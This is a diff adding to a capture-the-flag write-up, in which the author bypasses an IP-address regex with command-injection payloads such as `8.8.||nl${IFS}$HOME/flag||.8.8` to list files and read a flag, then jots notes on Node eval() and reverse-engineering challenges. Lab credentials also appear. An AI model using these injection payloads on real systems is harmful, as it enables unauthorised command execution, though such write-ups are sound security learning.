@@ -83,6 +83,38 @@ So I need to inject the payload in the ip address, the regular expression is `/^
 
 tried  `10.10.;ls;.10` nope.
 
+so, `8.8.||ls||.8.8` runs ls.
+```
+backup.zip
+ecosystem.config.js
+index.js
+node_modules
+package-lock.json
+package.json
+```
+`8.8.||ls${IFS}-al||.8.8`, where *the fuck* is the flag.
+
+but, `8.8.||ls${IFS}$HOME||.8.8` shows a flag file. the HOME is /home/ctf, `8.8.||nl${IFS}$HOME/flag||.8.8`, cat didnt *fucking* work. A friend suggested **nl** instead, 
+`     1	ACS_IXIA_CTF{p1ng_r3g3x_s71ll_n07_s4f3}`
+
+### Node Validation
+*ugh, node*
+
+the page had a few fields, the hint is an *eval()* in nodejs input validation.. *the fuck*
+
+`/^Animal SizeAnimal color\.weight$/i`
+
+`/^abc$/i` from a, b, c input.
+
+Everything is *fucking* escaped, where is the eval() function for *fuck's* sake.
+
+### Reverse: Santas Elf
+Give proper input to get control. Connect to 141.85.224.118:31337.
+
+
+
+
+
 ## Peas in a Pod
 The flag is found at `141.85.224.119`.
 You can log in as `ashley` with password `student`.
